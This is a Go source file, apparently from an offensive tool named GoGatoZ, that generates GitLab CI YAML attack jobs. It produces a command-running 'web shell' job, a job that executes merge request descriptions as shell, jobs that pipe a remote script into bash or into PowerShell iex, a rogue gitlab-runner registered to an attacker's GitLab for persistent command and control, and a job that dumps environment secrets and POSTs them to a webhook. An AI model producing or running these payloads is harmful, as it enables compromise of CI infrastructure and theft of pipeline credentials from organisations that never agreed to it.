// CommonOptions holds shared knobs for generated GitLab CI jobs.
type CommonOptions struct {
	JobName         string   // default varies per payload
	Stage           string   // default "attack"
	Image           string   // optional docker image
	Tags            []string // runner tags
	Manual          bool     // add a manual rule
	ArtifactsPath   string   // optional artifact path to upload
	ArtifactsExpire string   // e.g., "1 day"
	CoAuthor        string   // Co-authored-by trailer for commit messages (optional)
}

func (c *CommonOptions) defaults(job string) (name, stage string) {
	name = job
	if strings.TrimSpace(c.JobName) != "" {
		name = c.JobName
	}
	stage = "attack"
	if strings.TrimSpace(c.Stage) != "" {
		stage = c.Stage
	}
	return
}

func quoteJoin(a []string) string {
	if len(a) == 0 {
		return ""
	}
	parts := make([]string, 0, len(a))
	for _, s := range a {
		parts = append(parts, fmt.Sprintf("%q", strings.TrimSpace(s)))
	}
	return strings.Join(parts, ", ")
}

func tagsLine(tags []string) string {
	if len(tags) == 0 {
		return ""
	}
	return "\n  tags: [" + quoteJoin(tags) + "]"
}

func imageLine(img string) string {
	img = strings.TrimSpace(img)
	if img == "" {
		return ""
	}
	return "\n  image: " + img
}

func artifactsBlock(path, expire string) string {
	p := strings.TrimSpace(path)
	if p == "" {
		return ""
	}
	if strings.TrimSpace(expire) == "" {
		expire = "1 day"
	}
	return fmt.Sprintf("\n  artifacts:\n    when: always\n    paths:\n      - %s\n    expire_in: %s", p, expire)
}

func rulesManual(manual bool) string {
	if !manual {
		return ""
	}
	return "\n  rules:\n    - when: manual"
}

// RORShellOptions models a simple web shell payload akin to the GitHub ROR_SHELL, for GitLab.
type RORShellOptions struct {
	Common       CommonOptions
	Command      string // command to run (default id; uname -a)
	DownloadPath string // if set, upload this path as artifact instead of running arbitrary command
}

// GenerateRORShellYAML returns a single-job GitLab CI YAML that either runs a command or exfils a file as artifact.
func GenerateRORShellYAML(o RORShellOptions) string {
	name, stage := o.Common.defaults("webshell")
	cmd := strings.TrimSpace(o.Command)
	if cmd == "" {
		cmd = "id; uname -a"
	}
	var body string
	if strings.TrimSpace(o.DownloadPath) != "" {
		// artifact download path provided
		body = fmt.Sprintf(`
# Auto-generated by GoGatoZ (RoR Shell)
stages: [%s]

%s:
  stage: %s%s%s
  script:
    - echo "Preparing artifact from %s"
    - test -f %s || echo "warning: %s not found" || true
  %s
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags), o.DownloadPath, o.DownloadPath, o.DownloadPath, strings.TrimPrefix(artifactsBlock(o.Common.ArtifactsPath, o.Common.ArtifactsExpire), "\n  "), rulesManual(o.Common.Manual))
	} else {
		body = fmt.Sprintf(`
# Auto-generated by GoGatoZ (RoR Shell)
stages: [%s]

%s:
  stage: %s%s%s
  variables:
    CMD: %q
  script:
    - echo "$CMD" > .cmd.sh
    - bash .cmd.sh || true
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags), cmd, rulesManual(o.Common.Manual))
	}
	return body
}

// PwnRequestOptions generates a GitLab MR pipeline job that executes the MR description as shell.
type PwnRequestOptions struct {
	Common           CommonOptions
	TargetBranchExpr string // optional regex for target branch name; if set, adds condition
}

// GeneratePwnRequestYAML renders a job triggered only on merge_request_event and executes MR description.
func GeneratePwnRequestYAML(o PwnRequestOptions) string {
	name, stage := o.Common.defaults("pwn")
	cond := `$CI_PIPELINE_SOURCE == "merge_request_event"`
	if strings.TrimSpace(o.TargetBranchExpr) != "" {
		cond = cond + " && '$CI_MERGE_REQUEST_TARGET_BRANCH_NAME' =~ /" + o.TargetBranchExpr + "/"
	}
	return fmt.Sprintf(`
# Auto-generated by GoGatoZ (Pwn Request)
stages: [%s]

%s:
  stage: %s%s%s
  rules:
    - if: %s
  script:
    - echo "$CI_MERGE_REQUEST_DESCRIPTION" > /tmp/pr.sh
    - bash /tmp/pr.sh || true
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags), cond, artifactsBlock(o.Common.ArtifactsPath, o.Common.ArtifactsExpire))
}

// RunnerOnRunnerOptions renders a job that fetches and executes a remote script depending on target OS.
type RunnerOnRunnerOptions struct {
	Common           CommonOptions
	ScriptURL        string // required
	TargetOS         string // linux|windows|macos (default linux)
	KeepAliveSeconds int    // if >0, keep the job alive with a heartbeat loop
}

// GenerateRunnerOnRunnerYAML returns a job that executes a remote script (curl|bash or powershell).
func GenerateRunnerOnRunnerYAML(o RunnerOnRunnerOptions) string {
	name, stage := o.Common.defaults("ror")
	os := strings.ToLower(strings.TrimSpace(o.TargetOS))
	if os == "" {
		os = "linux"
	}
	url := strings.TrimSpace(o.ScriptURL)
	if url == "" {
		url = "https://example.invalid/payload.sh"
	}
	var b strings.Builder
	switch os {
	case "windows":
		fmt.Fprintf(&b, "    - powershell -NoProfile -ExecutionPolicy Bypass -Command \"iwr -UseBasicParsing -Uri %s | iex\"\n", url)
		if o.KeepAliveSeconds > 0 {
			// Heartbeat loop and long sleep to keep job alive
			fmt.Fprintf(&b, "    - powershell -NoProfile -Command \"while ($true) { Write-Host '[keepalive]' (Get-Date); Start-Sleep -Seconds %d }\"\n", o.KeepAliveSeconds)
		}
	case "macos", "darwin", "linux":
		fmt.Fprintf(&b, "    - curl -sSfL %s | bash\n", url)
		if o.KeepAliveSeconds > 0 {
			fmt.Fprintf(&b, "    - |")
			fmt.Fprintf(&b, "\n      while true; do echo \"[keepalive] $(date)\"; sleep %d; done &\n", o.KeepAliveSeconds)
			fmt.Fprintf(&b, "    - tail -f /dev/null\n")
		}
	default:
		fmt.Fprintf(&b, "    - curl -sSfL %s | bash\n", url)
	}
	return fmt.Sprintf(`
# Auto-generated by GoGatoZ (Runner-on-Runner)
stages: [%s]

%s:
  stage: %s%s%s
  script:
%s  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags), b.String(), rulesManual(o.Common.Manual))
}

// NestedRunnerOptions models a true Runner-on-Runner attack: download a gitlab-runner
// binary onto the compromised runner and register it with an attacker-controlled
// GitLab instance. The rogue runner provides persistent C2 through the attacker's repo.
type NestedRunnerOptions struct {
	Common            CommonOptions
	AttackerGitLabURL string // attacker's GitLab instance URL (required)
	RegistrationToken string // runner registration token from attacker's GitLab (required)
	RunnerName        string // name for the rogue runner (default: rogue-runner)
	RunnerTags        string // comma-separated tags for the rogue runner (default: rogue)
	Executor          string // executor type: shell|docker (default: shell)
	CallbackURL       string // optional URL to POST confirmation when runner is registered
	RunnerVersion     string // gitlab-runner version to download (default: latest)
}

// GenerateNestedRunnerYAML returns a CI job that downloads gitlab-runner, registers it
// with the attacker's GitLab, and starts it as a background service on the victim machine.
func GenerateNestedRunnerYAML(o NestedRunnerOptions) string {
	name, stage := o.Common.defaults("nested-runner")
	attackerURL := strings.TrimSpace(o.AttackerGitLabURL)
	regToken := strings.TrimSpace(o.RegistrationToken)
	runnerName := strings.TrimSpace(o.RunnerName)
	if runnerName == "" {
		runnerName = "rogue-runner"
	}
	runnerTags := strings.TrimSpace(o.RunnerTags)
	if runnerTags == "" {
		runnerTags = "rogue"
	}
	executor := strings.TrimSpace(o.Executor)
	if executor == "" {
		executor = "shell"
	}
	runnerVer := strings.TrimSpace(o.RunnerVersion)

	var downloadURL string
	if runnerVer != "" {
		downloadURL = fmt.Sprintf("https://gitlab-runner-downloads.s3.amazonaws.com/v%s/binaries/gitlab-runner-linux-$(dpkg --print-architecture 2>/dev/null || echo amd64)", runnerVer)
	} else {
		downloadURL = "https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-linux-$(dpkg --print-architecture 2>/dev/null || echo amd64)"
	}

	var callbackLine string
	if cb := strings.TrimSpace(o.CallbackURL); cb != "" {
		callbackLine = fmt.Sprintf("\n    - 'curl -sS -X POST -d \"{\\\"status\\\":\\\"registered\\\",\\\"runner\\\":\\\"$RUNNER_NAME\\\",\\\"host\\\":\\\"$(hostname)\\\"}\" %s || true'", cb)
	}

	return fmt.Sprintf(`
# Auto-generated by GoGatoZ (Nested Runner-on-Runner)
# Downloads gitlab-runner and registers it with the attacker's GitLab instance.
# The rogue runner persists as a background process, providing C2 via CI jobs.
stages: [%s]

%s:
  stage: %s%s%s
  variables:
    ATTACKER_GITLAB: "%s"
    REG_TOKEN: "%s"
    RUNNER_NAME: "%s"
    RUNNER_TAGS: "%s"
    RUNNER_EXECUTOR: "%s"
  script:
    - echo "[*] Downloading gitlab-runner..."
    - 'curl -fsSL %s -o /tmp/.gl-runner && chmod +x /tmp/.gl-runner'
    - 'mkdir -p /tmp/.builds /tmp/.cache'
    - echo "[*] Registering rogue runner with $ATTACKER_GITLAB..."
    - '/tmp/.gl-runner register --non-interactive --url "$ATTACKER_GITLAB" --token "$REG_TOKEN" --name "$RUNNER_NAME" --executor "$RUNNER_EXECUTOR" --builds-dir /tmp/.builds --cache-dir /tmp/.cache 2>&1 || true'
    - echo "[*] Starting rogue runner in background..."
    - 'nohup /tmp/.gl-runner run --working-directory /tmp/.builds > /tmp/.runner.log 2>&1 &'
    - echo "[+] Rogue runner started (PID=$!)"
    - 'echo "[+] Runner registered: name=$RUNNER_NAME tags=$RUNNER_TAGS executor=$RUNNER_EXECUTOR"'%s
    - echo "[*] Keeping job alive to maintain runner process..."
    - 'while true; do echo "[keepalive] $(date)"; sleep 300; done &'
    - tail -f /dev/null
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		attackerURL, regToken, runnerName, runnerTags, executor,
		downloadURL, callbackLine, rulesManual(o.Common.Manual))
}

// SecretsExfilOptions renders a job that exfils env/CI variables via artifact and optional webhook.
type SecretsExfilOptions struct {
	Common      CommonOptions
	WebhookURL  string // optional HTTP endpoint to POST env dump (legacy)
	ExfilMethod string // "artifact", "http", "dns", "icmp", "git", "cloud"
	ExfilTarget string // target for exfil method
}

// GenerateSecretsExfilYAML returns a GitLab job that collects env vars and exfils them.
func GenerateSecretsExfilYAML(o SecretsExfilOptions) string {
	name, stage := o.Common.defaults("secrets")

	// Build exfil-specific script lines
	method := strings.ToLower(strings.TrimSpace(o.ExfilMethod))
	target := strings.TrimSpace(o.ExfilTarget)
	var exfilLines string

	// Legacy webhook support (used when ExfilMethod is empty)
	if method == "" || method == "artifact" {
		post := strings.TrimSpace(o.WebhookURL)
		if post != "" {
			exfilLines = fmt.Sprintf("    - curl -sS -X POST -H 'Content-Type: text/plain' --data-binary @env.txt %s || true\n", post)
		}
	} else {
		exfilLines = payloadExfilScript(method, target)
	}

	artifactPath := o.Common.ArtifactsPath
	if strings.TrimSpace(artifactPath) == "" {
		artifactPath = "env.txt"
	}
	return fmt.Sprintf(`
# Auto-generated by GoGatoZ (Secrets Exfiltration)
stages: [%s]

%s:
  stage: %s%s%s
  script:
    - printenv | sort > env.txt
%s  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags), exfilLines, artifactsBlock(artifactPath, o.Common.ArtifactsExpire))
}

